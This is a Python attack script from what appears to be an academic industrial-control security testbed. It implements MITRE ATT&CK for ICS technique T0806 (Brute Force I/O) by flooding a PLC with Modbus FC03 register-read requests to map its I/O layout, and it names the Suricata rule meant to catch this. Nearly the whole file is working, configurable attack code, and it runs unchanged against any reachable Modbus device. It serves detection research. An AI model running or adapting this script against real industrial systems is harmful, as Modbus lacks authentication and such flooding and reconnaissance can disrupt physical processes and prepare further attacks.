#!/usr/bin/env python3
"""
ASCEND-PG attacks/brute_force_io.py

MITRE ATT&CK for ICS: T0806 — Brute Force I/O.

Simulates a brute-force attack on Modbus holding registers by sending
a high volume of FC03 (Read Holding Registers) requests across many
register addresses. The goal is to discover active registers and map
the PLC's I/O configuration.

Detection: The high request volume triggers Suricata's modbus.flooded
rule (SID 9000002) when the request rate exceeds the threshold.

Run this ON THE ATTACKER HOST:
    python3 attacks/brute_force_io.py --target 10.0.0.1 --count 200

ACADEMIC USE ONLY — isolated testbed, no production systems.
"""

import argparse
import json
import socket
import struct
import sys
import time
from datetime import datetime, timezone
from pathlib import Path

DEFAULT_LOG = Path(__file__).resolve().parent.parent / "data" / "log_store.json"

# Modbus MBAP header: Transaction ID (2) + Protocol ID (2) + Length (2) + Unit ID (1)
MBAP_HEADER_FMT = ">HHHB"
MBAP_HEADER_SIZE = 7


def build_read_holding_request(transaction_id: int, unit_id: int,
                               address: int, count: int) -> bytes:
    """Build a Modbus FC03 Read Holding Registers request."""
    # FC03 PDU: function code (1) + start address (2) + quantity (2)
    pdu = struct.pack(">BHH", 0x03, address, count)
    # MBAP header
    length = len(pdu) + 1  # +1 for unit ID
    header = struct.pack(MBAP_HEADER_FMT, transaction_id, 0, length, unit_id)
    return header + pdu


def log_event(log_path: Path, event: dict):
    """Append one event to the shared JSON log store (JSONL format)."""
    event["timestamp"] = datetime.now(timezone.utc).isoformat()
    log_path.parent.mkdir(parents=True, exist_ok=True)
    with open(log_path, "a", encoding="utf-8") as f:
        f.write(json.dumps(event) + "\n")


def run_brute_force(target: str, port: int, unit: int, count: int,
                    delay: float, start_addr: int, end_addr: int,
                    log_path: Path) -> dict:
    """Send rapid FC03 read requests across a range of register addresses.

    Returns dict with stats: requests_sent, responses_received, errors.
    """
    stats = {"requests_sent": 0, "responses_received": 0, "errors": 0}

    print(f"[brute_force] Connecting to {target}:{port}")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(2.0)

    try:
        sock.connect((target, port))
        print(f"[brute_force] Connected. Sending {count} requests across "
              f"addresses {start_addr}-{end_addr}")

        for i in range(count):
            # Cycle through register addresses
            addr = start_addr + (i % (end_addr - start_addr + 1))
            tx_id = i + 1

            request = build_read_holding_request(tx_id, unit, addr, 1)
            try:
                sock.sendall(request)
                stats["requests_sent"] += 1

                # Try to read response (non-blocking)
                try:
                    resp = sock.recv(1024)
                    if resp:
                        stats["responses_received"] += 1
                except socket.timeout:
                    pass  # No response yet, continue

            except (socket.timeout, OSError) as exc:
                stats["errors"] += 1
                if stats["errors"] <= 3:
                    print(f"[brute_force] Send error on request {i}: {exc}")

            if delay > 0:
                time.sleep(delay)

            # Progress indicator every 50 requests
            if (i + 1) % 50 == 0:
                print(f"[brute_force] Progress: {i + 1}/{count} requests sent")

    except (socket.timeout, OSError) as exc:
        print(f"[brute_force] Connection error: {exc}")
        stats["errors"] += 1
    finally:
        sock.close()

    return stats


def main():
    parser = argparse.ArgumentParser(
        description="ASCEND-PG Brute Force I/O (T0806) — rapid register "
                    "read requests to discover PLC I/O configuration"
    )
    parser.add_argument("--target", required=True,
                        help="Target PLC IP address")
    parser.add_argument("-p", "--port", type=int, default=502,
                        help="Modbus TCP port (default: 502)")
    parser.add_argument("-u", "--unit", type=int, default=1,
                        help="Modbus unit/slave ID (default: 1)")
    parser.add_argument("-c", "--count", type=int, default=200,
                        help="Number of requests to send (default: 200)")
    parser.add_argument("-d", "--delay", type=float, default=0.01,
                        help="Delay between requests in seconds (default: 0.01)")
    parser.add_argument("--start-address", type=int, default=0,
                        help="First register address (default: 0)")
    parser.add_argument("--end-address", type=int, default=99,
                        help="Last register address (default: 99)")
    parser.add_argument("--log", default=str(DEFAULT_LOG),
                        help="Path to the shared event log store")
    args = parser.parse_args()

    log_path = Path(args.log)
    log_path.parent.mkdir(parents=True, exist_ok=True)

    log_event(log_path, {
        "stage": "attack", "technique": "T0806",
        "action": "brute_force_start",
        "target": args.target, "count": args.count,
        "delay": args.delay,
    })

    stats = run_brute_force(
        args.target, args.port, args.unit, args.count, args.delay,
        args.start_address, args.end_address, log_path,
    )

    log_event(log_path, {
        "stage": "attack", "technique": "T0806",
        "action": "brute_force_end",
        "target": args.target,
        "requests_sent": stats["requests_sent"],
        "responses_received": stats["responses_received"],
        "errors": stats["errors"],
    })

    print(f"\n[brute_force] Done — {stats['requests_sent']} sent, "
          f"{stats['responses_received']} responses, "
          f"{stats['errors']} errors")


if __name__ == "__main__":
    main()
